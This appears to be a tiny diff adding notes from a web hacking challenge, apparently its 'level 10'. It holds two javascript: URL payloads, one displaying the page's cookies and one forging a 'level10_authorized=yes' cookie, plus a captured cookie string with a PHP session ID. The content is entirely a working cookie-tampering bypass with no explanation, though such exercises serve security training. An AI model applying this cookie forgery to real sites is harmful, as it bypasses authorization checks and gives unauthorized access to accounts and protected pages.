@@ -1,0 +1,4 @@
+javascript:alert(document.cookie);
+level10_authorized=no; PHPSESSID=nteqr2lhij2luep4b364eh5ui2; style_cookie=null
+
+javascript:void(document.cookie="level10_authorized=yes");
